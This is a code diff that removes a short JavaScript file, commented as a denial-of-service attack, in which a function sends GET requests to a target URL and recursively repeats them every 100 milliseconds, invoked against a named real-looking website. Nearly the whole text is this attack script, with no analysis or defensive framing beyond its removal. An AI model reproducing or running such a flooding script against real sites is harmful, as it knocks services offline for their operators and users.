@@ -1,13 +1,1 @@
-// JavaScript code to perform a DoS attack
-function dosAttack(targetUrl) {
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', targetUrl, true);
-    xhr.send();
 
-    setTimeout(function() {
-        dosAttack(targetUrl); // Recursively call the function to send multiple requests
-    }, 100); // Adjust the interval as needed
-}
-
-// Replace 'http://example.com' with the target URL
-dosAttack('https://gdvtanaki.vn');
